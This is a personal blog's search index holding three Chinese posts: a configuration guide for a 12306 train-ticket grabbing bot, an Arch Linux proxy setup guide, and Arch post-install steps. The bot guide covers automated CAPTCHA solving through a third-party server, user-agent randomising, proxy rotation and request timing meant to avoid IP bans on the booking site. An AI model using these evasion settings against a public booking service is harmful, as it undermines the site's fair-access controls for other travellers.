<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>12306购票小助手使用</title>
    <url>/posts/249efd0/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 获取项目文件</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;testerSunshine&#x2F;12306.git</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="配置助手"><a href="#配置助手" class="headerlink" title="配置助手"></a>配置助手</h1><h2 id="刷票模式："><a href="#刷票模式：" class="headerlink" title="刷票模式："></a>刷票模式：</h2><p><code>1</code>:刷票 <code>2</code>:候补+刷票</p>
<p><code>TICKET_TYPE = 1</code></p>
<h2 id="出发日期"><a href="#出发日期" class="headerlink" title="出发日期"></a>出发日期</h2><p><code>&quot;2018-01-06&quot;, &quot;2018-01-07&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STATION_DATES &#x3D; [</span><br><span class="line">    &quot;2020-01-23&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="填入需要购买的车次-list"><a href="#填入需要购买的车次-list" class="headerlink" title="填入需要购买的车次(list)"></a>填入需要购买的车次(list)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G1353,</span><br><span class="line">G1233</span><br></pre></td></tr></table></figure>
<p>修改车次填入规则，注：(以前设置的车次逻辑不变)，如果车次填入为空，那么就是当日乘车所有车次都纳入筛选返回</p>
<p>不填车次是整个list为空才算，如果不是为空，依然会判断车次的，这种是错误的写法 [“”], 正确的写法 []</p>
<p><code>STATION_TRAINS = [G11540]</code></p>
<h2 id="出发城市"><a href="#出发城市" class="headerlink" title="出发城市"></a>出发城市</h2><p>比如深圳北，填深圳就搜得到</p>
<p><code>FROM_STATION = &quot;深圳&quot;</code></p>
<h2 id="到达城市"><a href="#到达城市" class="headerlink" title="到达城市"></a>到达城市</h2><p>比如南京南，填南京就搜得到</p>
<p><code>TO_STATION = &quot;南京&quot;</code></p>
<h2 id="座位"><a href="#座位" class="headerlink" title="座位"></a>座位</h2><p>多个座位ex:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;商务座&quot;,</span><br><span class="line">&quot;一等座&quot;,</span><br><span class="line">&quot;二等座&quot;,</span><br><span class="line">&quot;特等座&quot;,</span><br><span class="line">&quot;软卧&quot;,</span><br><span class="line">&quot;硬卧&quot;,</span><br><span class="line">&quot;硬座&quot;,</span><br><span class="line">&quot;无座&quot;,</span><br><span class="line">&quot;动卧&quot;,</span><br></pre></td></tr></table></figure>
<p><code>SET_TYPE = [&quot;二等座&quot;]</code></p>
<h2 id="乘车人"><a href="#乘车人" class="headerlink" title="乘车人"></a>乘车人</h2><p>多个乘车人ex:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;张三&quot;,</span><br><span class="line">&quot;李四&quot;</span><br></pre></td></tr></table></figure>
<p><code>TICKET_PEOPLES = [张三]</code></p>
<h2 id="12306登录账号"><a href="#12306登录账号" class="headerlink" title="12306登录账号"></a>12306登录账号</h2><p><code>USER = &quot;xxxxx&quot;</code></p>
<p><code>PWD = &quot;xxxx&quot;</code></p>
<h2 id="自动打码"><a href="#自动打码" class="headerlink" title="自动打码"></a>自动打码</h2><p><code>IS_AUTO_CODE = True</code></p>
<p>2为本地自动打码，需要配置tensorflow和keras库</p>
<p>3为云打码，由于云打码服务器资源有限(为2h4C的cpu服务器)，请不要恶意请求，不然只能关闭服务器</p>
<p>ps: 请不要一直依赖云服务器资源，在此向所有提供服务器同学表示感谢</p>
<p><code>AUTO_CODE_TYPE = 3</code></p>
<p>设置云打码服务器地址，如果有自建的服务器，可以自行更改：</p>
<p><code>HOST = &quot;120.77.154.140:8000&quot;</code></p>
<p>docker 本地打码服务器：</p>
<p><code>HOST = &quot;captcha:80&quot;</code></p>
<p><code>REQ_URL = &quot;/verify/base64/&quot;</code></p>
<p><code>HTTP_TYPE = &quot;http&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HOST&#x3D;&quot;12306.yinaoxiong.cn&quot; #备用服务器稳定性较差</span><br><span class="line">REQ_URL&#x3D;&quot;&#x2F;verify&#x2F;base64&#x2F;&quot;</span><br><span class="line">HTTP_TYPE&#x3D;&quot;https&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  邮箱配置，如果抢票成功，将通过邮件配置通知给您</span><br><span class="line">#  列举163</span><br><span class="line">#  email: &quot;xxx@163.com&quot;</span><br><span class="line">#  notice_email_list: &quot;123@qq.com&quot;</span><br><span class="line">#  username: &quot;xxxxx&quot;</span><br><span class="line">#  password: &quot;xxxxx</span><br><span class="line">#  host: &quot;smtp.163.com&quot;</span><br><span class="line">#  列举qq  ，qq设置比较复杂，需要在邮箱--&gt;账户--&gt;开启smtp服务，取得授权码&#x3D;&#x3D;邮箱登录密码</span><br><span class="line">#  email: &quot;xxx@qq.com&quot;</span><br><span class="line">#  notice_email_list: &quot;123@qq.com&quot;</span><br><span class="line">#  username: &quot;xxxxx&quot;</span><br><span class="line">#  password: &quot;授权码&quot;</span><br><span class="line">#  host: &quot;smtp.qq.com&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EMAIL_CONF &#x3D; &#123;</span><br><span class="line">    &quot;IS_MAIL&quot;: True,</span><br><span class="line">    &quot;email&quot;: &quot;&quot;,</span><br><span class="line">    &quot;notice_email_list&quot;: &quot;&quot;,</span><br><span class="line">    &quot;username&quot;: &quot;&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;&quot;,</span><br><span class="line">    &quot;host&quot;: &quot;smtp.qq.com&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>是否开启 server酱 微信提醒， 使用前需要前往 <a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a> 扫码绑定获取 SECRET 并关注获得抢票结果通知的公众号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SERVER_CHAN_CONF &#x3D; &#123;</span><br><span class="line">    &quot;is_server_chan&quot;: False,</span><br><span class="line">    &quot;secret&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>是否开启cdn查询，可以更快的检测票票 1为开启，2为关闭<br><code>IS_CDN = 1</code></p>
</li>
<li><p>下单接口分为两种，1 模拟网页自动捡漏下单（不稳定），2 模拟车次后面的购票按钮下单（稳如老狗）<br><code>ORDER_TYPE = 2</code></p>
</li>
</ul>
<h1 id="下单模式-1-为预售，整点刷新，刷新间隔0-1-0-5S-然后会校验时间，比如12点的预售，那脚本就会在12-00整检票，刷新订单"><a href="#下单模式-1-为预售，整点刷新，刷新间隔0-1-0-5S-然后会校验时间，比如12点的预售，那脚本就会在12-00整检票，刷新订单" class="headerlink" title="下单模式 1 为预售，整点刷新，刷新间隔0.1-0.5S, 然后会校验时间，比如12点的预售，那脚本就会在12.00整检票，刷新订单"></a>下单模式 1 为预售，整点刷新，刷新间隔0.1-0.5S, 然后会校验时间，比如12点的预售，那脚本就会在12.00整检票，刷新订单</h1><h1 id="2-是捡漏，捡漏的刷新间隔时间为0-5-3秒，时间间隔长，不容易封ip"><a href="#2-是捡漏，捡漏的刷新间隔时间为0-5-3秒，时间间隔长，不容易封ip" class="headerlink" title="2 是捡漏，捡漏的刷新间隔时间为0.5-3秒，时间间隔长，不容易封ip"></a>2 是捡漏，捡漏的刷新间隔时间为0.5-3秒，时间间隔长，不容易封ip</h1><p>ORDER_MODEL = 2</p>
<h1 id="是否开启代理-0代表关闭，-1表示开始"><a href="#是否开启代理-0代表关闭，-1表示开始" class="headerlink" title="是否开启代理, 0代表关闭， 1表示开始"></a>是否开启代理, 0代表关闭， 1表示开始</h1><h1 id="开启此功能的时候请确保代理ip是否可用，在测试放里面经过充分的测试，再开启此功能，不然可能会耽误你购票的宝贵时间"><a href="#开启此功能的时候请确保代理ip是否可用，在测试放里面经过充分的测试，再开启此功能，不然可能会耽误你购票的宝贵时间" class="headerlink" title="开启此功能的时候请确保代理ip是否可用，在测试放里面经过充分的测试，再开启此功能，不然可能会耽误你购票的宝贵时间"></a>开启此功能的时候请确保代理ip是否可用，在测试放里面经过充分的测试，再开启此功能，不然可能会耽误你购票的宝贵时间</h1><h1 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h1><h1 id="1、在agency-proxy-list列表下填入代理ip"><a href="#1、在agency-proxy-list列表下填入代理ip" class="headerlink" title="1、在agency/proxy_list列表下填入代理ip"></a>1、在agency/proxy_list列表下填入代理ip</h1><h1 id="2、测试UnitTest-TestAll-testProxy-测试代理是否可以用"><a href="#2、测试UnitTest-TestAll-testProxy-测试代理是否可以用" class="headerlink" title="2、测试UnitTest/TestAll/testProxy 测试代理是否可以用"></a>2、测试UnitTest/TestAll/testProxy 测试代理是否可以用</h1><h1 id="3、开启代理ip"><a href="#3、开启代理ip" class="headerlink" title="3、开启代理ip"></a>3、开启代理ip</h1><p>IS_PROXY = 0</p>
<h1 id="预售放票时间-如果是捡漏模式，可以忽略此操作"><a href="#预售放票时间-如果是捡漏模式，可以忽略此操作" class="headerlink" title="预售放票时间, 如果是捡漏模式，可以忽略此操作"></a>预售放票时间, 如果是捡漏模式，可以忽略此操作</h1><p>OPEN_TIME = “12:59:57”</p>
<h1 id="1-使用selenium获取devicesID"><a href="#1-使用selenium获取devicesID" class="headerlink" title="1=使用selenium获取devicesID"></a>1=使用selenium获取devicesID</h1><h1 id="2-使用网页端-otn-HttpZF-logdevice获取devicesId，这个接口的算法目前可能有点问题，如果登录一直302的请改为配置1"><a href="#2-使用网页端-otn-HttpZF-logdevice获取devicesId，这个接口的算法目前可能有点问题，如果登录一直302的请改为配置1" class="headerlink" title="2=使用网页端/otn/HttpZF/logdevice获取devicesId，这个接口的算法目前可能有点问题，如果登录一直302的请改为配置1"></a>2=使用网页端/otn/HttpZF/logdevice获取devicesId，这个接口的算法目前可能有点问题，如果登录一直302的请改为配置1</h1><h1 id="3-自己打开浏览器在headers-Cookies中抓取RAIL-DEVICEID和RAIL-EXPIRATION，这个就不用配置selenium"><a href="#3-自己打开浏览器在headers-Cookies中抓取RAIL-DEVICEID和RAIL-EXPIRATION，这个就不用配置selenium" class="headerlink" title="3=自己打开浏览器在headers-Cookies中抓取RAIL_DEVICEID和RAIL_EXPIRATION，这个就不用配置selenium"></a>3=自己打开浏览器在headers-Cookies中抓取RAIL_DEVICEID和RAIL_EXPIRATION，这个就不用配置selenium</h1><p>COOKIE_TYPE = 3</p>
<h1 id="如果COOKIE-TYPE-1，则需配置chromeDriver路径-下载地址http-chromedriver-storage-googleapis-com-index-html"><a href="#如果COOKIE-TYPE-1，则需配置chromeDriver路径-下载地址http-chromedriver-storage-googleapis-com-index-html" class="headerlink" title="如果COOKIE_TYPE=1，则需配置chromeDriver路径,下载地址http://chromedriver.storage.googleapis.com/index.html"></a>如果COOKIE_TYPE=1，则需配置chromeDriver路径,下载地址<a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a></h1><h1 id="chromedriver配置版本只要和chrome的大版本匹配就行"><a href="#chromedriver配置版本只要和chrome的大版本匹配就行" class="headerlink" title="chromedriver配置版本只要和chrome的大版本匹配就行"></a>chromedriver配置版本只要和chrome的大版本匹配就行</h1><p>CHROME_PATH = “/usr/src/app/chromedriver”</p>
<h1 id="为了docker37-准备的环境变量，windows环境可以不用管这个参数"><a href="#为了docker37-准备的环境变量，windows环境可以不用管这个参数" class="headerlink" title="为了docker37 准备的环境变量，windows环境可以不用管这个参数"></a>为了docker37 准备的环境变量，windows环境可以不用管这个参数</h1><p>CHROME_CHROME_PATH = “/opt/google/chrome/google-chrome”</p>
<h1 id="如果COOKIE-TYPE-3-则需配置RAIL-EXPIRATION、RAIL-DEVICEID的值"><a href="#如果COOKIE-TYPE-3-则需配置RAIL-EXPIRATION、RAIL-DEVICEID的值" class="headerlink" title="如果COOKIE_TYPE=3, 则需配置RAIL_EXPIRATION、RAIL_DEVICEID的值"></a>如果COOKIE_TYPE=3, 则需配置RAIL_EXPIRATION、RAIL_DEVICEID的值</h1><p>RAIL_EXPIRATION = “”<br>RAIL_DEVICEID = “”</p>
<h1 id="RAIL-EXPIRATION-“1577034103293”"><a href="#RAIL-EXPIRATION-“1577034103293”" class="headerlink" title="RAIL_EXPIRATION = “1577034103293”"></a>RAIL_EXPIRATION = “1577034103293”</h1><h1 id="RAIL-DEVICEID-“CDno29Erc-Pf3FSXb4dzq-Op64EhWrsi5yUZKVIKR1MAfYo2qFlCeXD8VkexY7-1qg-ClV-fE8j9jgVlPZxRh3wVc2iqLe-5A8sdr62qZx4B22JPF8lFCjpgTKZ5ODW90HJd5tiQsJ1KR9nOqHRxHj1FT5LEIwfw”"><a href="#RAIL-DEVICEID-“CDno29Erc-Pf3FSXb4dzq-Op64EhWrsi5yUZKVIKR1MAfYo2qFlCeXD8VkexY7-1qg-ClV-fE8j9jgVlPZxRh3wVc2iqLe-5A8sdr62qZx4B22JPF8lFCjpgTKZ5ODW90HJd5tiQsJ1KR9nOqHRxHj1FT5LEIwfw”" class="headerlink" title="RAIL_DEVICEID = “CDno29Erc_Pf3FSXb4dzq-Op64EhWrsi5yUZKVIKR1MAfYo2qFlCeXD8VkexY7_1qg-ClV-fE8j9jgVlPZxRh3wVc2iqLe_5A8sdr62qZx4B22JPF8lFCjpgTKZ5ODW90HJd5tiQsJ1KR9nOqHRxHj1FT5LEIwfw”"></a>RAIL_DEVICEID = “CDno29Erc_Pf3FSXb4dzq-Op64EhWrsi5yUZKVIKR1MAfYo2qFlCeXD8VkexY7_1qg-ClV-fE8j9jgVlPZxRh3wVc2iqLe_5A8sdr62qZx4B22JPF8lFCjpgTKZ5ODW90HJd5tiQsJ1KR9nOqHRxHj1FT5LEIwfw”</h1><h1 id="1-gt-为一直随机ua-2-gt-只启动的时候随机一次ua"><a href="#1-gt-为一直随机ua-2-gt-只启动的时候随机一次ua" class="headerlink" title="1=&gt;为一直随机ua,2-&gt;只启动的时候随机一次ua"></a>1=&gt;为一直随机ua,2-&gt;只启动的时候随机一次ua</h1><p>RANDOM_AGENT = 2</p>
<p>PASSENGER_TICKER_STR = {<br>    ‘一等座’: ‘M’,<br>    ‘特等座’: ‘P’,<br>    ‘二等座’: ‘O’,<br>    ‘商务座’: 9,<br>    ‘硬座’: 1,<br>    ‘无座’: 1,<br>    ‘软座’: 2,<br>    ‘软卧’: 4,<br>    ‘硬卧’: 3,<br>}</p>
<h1 id="保护12306官网请求频率，设置随机请求时间，原则为5分钟不大于80次"><a href="#保护12306官网请求频率，设置随机请求时间，原则为5分钟不大于80次" class="headerlink" title="保护12306官网请求频率，设置随机请求时间，原则为5分钟不大于80次"></a>保护12306官网请求频率，设置随机请求时间，原则为5分钟不大于80次</h1><h1 id="最大间隔请求时间"><a href="#最大间隔请求时间" class="headerlink" title="最大间隔请求时间"></a>最大间隔请求时间</h1><p>MAX_TIME = 3</p>
<h1 id="最小间隔请求时间"><a href="#最小间隔请求时间" class="headerlink" title="最小间隔请求时间"></a>最小间隔请求时间</h1><p>MIN_TIME = 1</p>
<h1 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h1><p>RE_VERSION = “1.2.004”</p>
<p>```</p>
]]></content>
      <tags>
        <tag>12306</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux代理</title>
    <url>/posts/a83bb0/</url>
    <content><![CDATA[<h1 id="环境变量代理"><a href="#环境变量代理" class="headerlink" title="环境变量代理"></a>环境变量代理</h1><h2 id="普通代理"><a href="#普通代理" class="headerlink" title="普通代理"></a>普通代理</h2><p>要将代理环境变量提供给所有用户和所有应用程序，将命令添加到脚本中,如:<code>/etc/profile.d/proxy.sh</code>,然后脚本必须有可执行限。 当使用Xfce之类的桌面环境时，此方法很有用。 例如Xfce通过此方法设置的变量运行Chromium浏览器进行Chromium浏览器代理。</p>
<a id="more"></a>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> proxy=http://127.0.0.1:8080</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;<span class="variable">$proxy</span>&quot;</span> \</span><br><span class="line">       https_proxy=<span class="variable">$proxy</span> \</span><br><span class="line">       ftp_proxy=<span class="variable">$proxy</span> \</span><br><span class="line">       rsync_proxy=<span class="variable">$proxy</span> \</span><br><span class="line">       HTTP_PROXY=<span class="variable">$proxy</span> \</span><br><span class="line">       HTTPS_PROXY=<span class="variable">$proxy</span> \</span><br><span class="line">       FTP_PROXY=<span class="variable">$proxy</span> \</span><br><span class="line">       RSYNC_PROXY=<span class="variable">$proxy</span></span><br><span class="line"><span class="built_in">export</span> no_proxy=<span class="string">&quot;localhost,127.0.0.1,localaddress,.localdomain.com&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>curl</code> 和 <code>pacman</code> 代理</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> all_proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
<p><strong>另外，还有一个名为<code>proxyman-git</code>(AUR)的工具，可以轻松配置系统范围的代理设置。 它还处理<code>git</code>，<code>npm</code>，<code>Dropbox</code>等其他软件的代理配置。</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> 		代理服务器设置</span><br><span class="line">uset 		取消代理设置</span><br><span class="line">list 		列出当前设置</span><br><span class="line">configs 	列出可用的配置</span><br><span class="line">load 		加载配置文件</span><br><span class="line">delete 		删除个人资料</span><br><span class="line"><span class="built_in">help</span> 		显示此帮助</span><br></pre></td></tr></table></figure>
<p>配置文件位置<code>~/.config/proxyman/</code></p>
<p>例:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxyman <span class="built_in">set</span></span><br><span class="line"> Enter details to <span class="built_in">set</span> proxy</span><br><span class="line"> HTTP Proxy  Host 127.0.0.1</span><br><span class="line"> HTTP Proxy  Port 8889</span><br><span class="line"> Use auth - userid/password (y/n)? n</span><br><span class="line"> Use same <span class="keyword">for</span> HTTPS and FTP (y/n)? y</span><br><span class="line"> No Proxy  (default localhost,127.0.0.1,192.168.1.1,::1,*.<span class="built_in">local</span>)</span><br><span class="line">Save profile <span class="keyword">for</span> later use (y/n)? y</span><br><span class="line"> Enter profile name  : v2ray_http</span><br><span class="line">Saved to /home/eonun/.config/proxyman/v2ray_http.</span><br><span class="line"></span><br><span class="line"> Select targets to modify</span><br><span class="line">| 1 | All of them ... Don<span class="string">&#x27;t bother me</span></span><br><span class="line"><span class="string">| 2 | Terminal / bash / zsh (current user)</span></span><br><span class="line"><span class="string">| 3 | /etc/environment</span></span><br><span class="line"><span class="string">| 4 | apt/dnf (Package manager)</span></span><br><span class="line"><span class="string">| 5 | Desktop settings (GNOME/Ubuntu/KDE)</span></span><br><span class="line"><span class="string">| 6 | npm &amp; yarn</span></span><br><span class="line"><span class="string">| 7 | Dropbox</span></span><br><span class="line"><span class="string">| 8 | Git</span></span><br><span class="line"><span class="string">| 9 | Docker</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Separate multiple choices with space</span></span><br><span class="line"><span class="string"> ? 1</span></span><br><span class="line"><span class="string">Setting proxy...</span></span><br><span class="line"><span class="string">To activate in current terminal window</span></span><br><span class="line"><span class="string">run source ~/.bashrc</span></span><br><span class="line"><span class="string">To activate in current terminal window</span></span><br><span class="line"><span class="string">run source ~/.zshrc</span></span><br><span class="line"><span class="string">Done</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<h2 id="保持通过代理-sudo"><a href="#保持通过代理-sudo" class="headerlink" title="保持通过代理 sudo"></a>保持通过代理 <code>sudo</code></h2><p>将以下行添加到sudo配置文件<code>/etc/sudoers.d/05_proxy</code>中:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Defaults env_keep +&#x3D; &quot;*_proxy *_PROXY&quot;</span><br></pre></td></tr></table></figure>
<h1 id="软件代理"><a href="#软件代理" class="headerlink" title="软件代理"></a>软件代理</h1><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>安装 <code>proxychains-ng</code> (既能代理socks,又能代理http),配置文件<code>/etc/proxychains.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># socks5</span><br><span class="line">socks5 127.0.0.1 8080</span><br><span class="line">socks4 127.0.0.1 9050</span><br><span class="line"></span><br><span class="line"># http</span><br><span class="line">http 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
<p>使用 <code>proxychains xxxx</code> 通过代理运行程序 <code>xxxx</code> 。</p>
<h2 id="tsocks"><a href="#tsocks" class="headerlink" title="tsocks"></a>tsocks</h2><p>安装<code>tsocks</code>(只能代理socks),配置文件 <code>/etc/tsocks.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#x3D; 127.0.0.1</span><br><span class="line">server_port &#x3D; 8080</span><br><span class="line">server_type &#x3D; 5</span><br><span class="line">default_user &#x3D; &quot;&quot;</span><br><span class="line">default_pass &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure>
<p><strong>curl 和 pacman 代理</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> all_proxy=<span class="string">&quot;socks5://your.proxy:1080&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h1><p>浏览器可使用软件代理进行代理，也可用插件代理</p>
<p>Firefox 自带代理功能</p>
<p>Chromium 可安装插件 <code>SwitchyOmega</code> (<a href="https://github.com/FelisCatus/SwitchyOmega">GitHub官网</a>)</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux安装后配置</title>
    <url>/posts/e4b0c9cf/</url>
    <content><![CDATA[<h1 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h1><p>有线网自动获取IP<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure></p>
<p>连接无线网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifi-menu</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h1 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h1><p>在linux上root就是上帝，能对系统进行任何操作，包括删除系统文件，所有使用root操作是很危险的，通常都是创建一个普通用户来使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m username</span><br></pre></td></tr></table></figure>
<p><code>-m</code>:创建用户的家目录<code>/home/username</code><br><code>username</code>:创建的用户名</p>
<h2 id="给用户设置密码"><a href="#给用户设置密码" class="headerlink" title="给用户设置密码"></a>给用户设置密码</h2><p>root具有上帝权限，所以无需验证任何用户的密码就能修改用户的密码，新建的用户还没有密码所以还无法登录(但root通过<code>su</code>命令能无密码登录)，所以需要给用户设置密码后用户才能登录</p>
<p>给<code>username</code>设置密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure><br>连续输入两次密码回车即可（linux不显示密码的输入）</p>
<h1 id="配置sudo"><a href="#配置sudo" class="headerlink" title="配置sudo"></a>配置sudo</h1><p>创建了普通用户，但很多情况下需要用到root的权限怎么办呢?这就需要用到<code>sudo</code>来提权了</p>
<p>sudo 能临时赋予用户root的部分管理权限，达到使用root运行相关指令的目的,比如arch的包管理器<code>pacman</code>就需要root权限,也就是说安装软件就需要root权限</p>
<h2 id="安装sudo软件包"><a href="#安装sudo软件包" class="headerlink" title="安装sudo软件包:"></a>安装sudo软件包:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure>
<p>若安装基础包时安装了<code>base-devel</code>包就无需安装了,<code>base-devel</code>软件包含有<code>sudo</code></p>
<p><strong>配置sudo</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /sudoers</span><br></pre></td></tr></table></figure></p>
<p>打开配置文件后找到<code>%wheel ALL=(ALL)ALL</code>，去掉注释<code>#</code>，重启<code>reboot</code>，给整个用户组权限</p>
<p>也可直接添加一条<code>username ALL=(ALL)ALL</code>给用户权限</p>
<h2 id="加入wheel用户组"><a href="#加入wheel用户组" class="headerlink" title="加入wheel用户组"></a>加入wheel用户组</h2><p>将用户加入whell用户组<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -G wheel username</span><br></pre></td></tr></table></figure></p>
<p>wheel 组的概念继承自 UNIX，当需要进行一些高级维护时，往往要用到 root 权限；而wheel 组是一个包含特殊权限的用户组，用来满足需要 root 权限的需求。</p>
<p>对于服务器来说，我们希望只有属于 wheel 组的用户才可以用 <code>su</code> 登录 root。这样就进一步增强了系统的安全性。具体步骤如下：</p>
<ul>
<li><p>修改 <code>/etc/pam.d/su</code> 文件，找到<code>#auth required /lib/security/$ISA/pam_wheel.so use_uid</code>，将行首的注释<code>#</code>去掉。</p>
</li>
<li><p>修改 <code>/etc/login.defs</code> 文件，在最后一行增加：<code>SU_WHEEL_ONLY yes</code>。</p>
</li>
</ul>
<p>然后，用<code>usermod -G wheel username</code> 将用户添加到 wheel 组中,这样被添加到 wheel 组的用户登录，就能执行 <code>su</code> 命令输入正确的 root 密码就可以正常的登录为 root 用户了。</p>
<h1 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h1><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><div class="table-container">
<table>
<thead>
<tr>
<th>品牌</th>
<th>驱动</th>
<th>驱动类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>AMD/ATI</td>
<td><code>xf86-video-amdgpu</code>、<code>xf86-video-ati</code></td>
<td>开源</td>
</tr>
<tr>
<td></td>
<td><code>catalyst</code>(AUR)</td>
<td>闭源</td>
</tr>
<tr>
<td>Intel</td>
<td><code>xf86-video-intel</code></td>
<td>开源</td>
</tr>
<tr>
<td>Nvidia</td>
<td><code>xf86-video-nonveau</code></td>
<td>开源</td>
</tr>
<tr>
<td></td>
<td><code>nvidia</code>、<code>nvidia-340xx</code>、<code>nvidia-304xx</code></td>
<td>闭源</td>
</tr>
</tbody>
</table>
</div>
<p>参照表格安装相应的驱动，通常安装集显的开源驱动就够用，若需要打点游戏，做点图什么的可以安装独立显卡的闭源驱动提升性能。<font color="ff0000"><strong>安装闭源驱动一定要查看wiki根据说明安装，不然可能回无法正常进入系统</strong></font></p>
<p>查看被识别的显卡:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lspci | grep -e VGA -e 3D</span><br></pre></td></tr></table></figure></p>
<p>搜索开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Ss xf86-video</span><br></pre></td></tr></table></figure></p>
<p>安装intel集显开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xf86-video-intel</span><br></pre></td></tr></table></figure></p>
<h2 id="安装Xorg"><a href="#安装Xorg" class="headerlink" title="安装Xorg"></a>安装Xorg</h2><p>Xorg是Linux下的一个著名的开源图形服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xorg</span><br></pre></td></tr></table></figure>
<h2 id="安装桌面"><a href="#安装桌面" class="headerlink" title="安装桌面"></a>安装桌面</h2><p>Linux下有很多著名的<a href="https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments">桌面环境</a>如：</p>
<ul>
<li>Xfce</li>
<li>KDE(Plasma)</li>
<li>Gnome</li>
<li>Unity</li>
<li>Deepin(深度的国产桌面环境)</li>
</ul>
<p>自行选择安装即可</p>
<p>如:</p>
<ul>
<li>Xfce :<code>sudo pacman -S xfce4 xfce4-goodies</code></li>
<li>KDE(Plasma):<code>sudo pacman -S plasma kde-application</code></li>
<li>Gnome:<code>sudo pacman -S gnome gnome-extra</code></li>
<li>Deepin:<code>sudo pacman -S deepin deepin-extra</code></li>
</ul>
<h2 id="安装桌面管理器"><a href="#安装桌面管理器" class="headerlink" title="安装桌面管理器"></a>安装桌面管理器</h2><p>安装好了桌面环境包以后，需要安装一个<a href="https://wiki.archlinux.org/index.php/Display_manager">桌面管理器</a>来帮助我们登录且选择使用的桌面环境</p>
<ul>
<li>LightDM : <code>sudo pacman -S lighdm</code></li>
<li>sddm : <code>sudo pacman -S sddm</code></li>
<li>GDM : <code>sudo pacman -S gdm</code></li>
</ul>
<p><strong>启动桌面管理器服务</strong></p>
<p>服务管理<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开机启动/关闭开启启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> xxxx</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动/停止服务</span></span><br><span class="line">sudo systemctl start xxxx</span><br><span class="line">sudo systemctl stop xxxx</span><br></pre></td></tr></table></figure></p>
<p>如设置开机启动<code>sddm</code>: <code>sudo systemctl enable sddm</code></p>
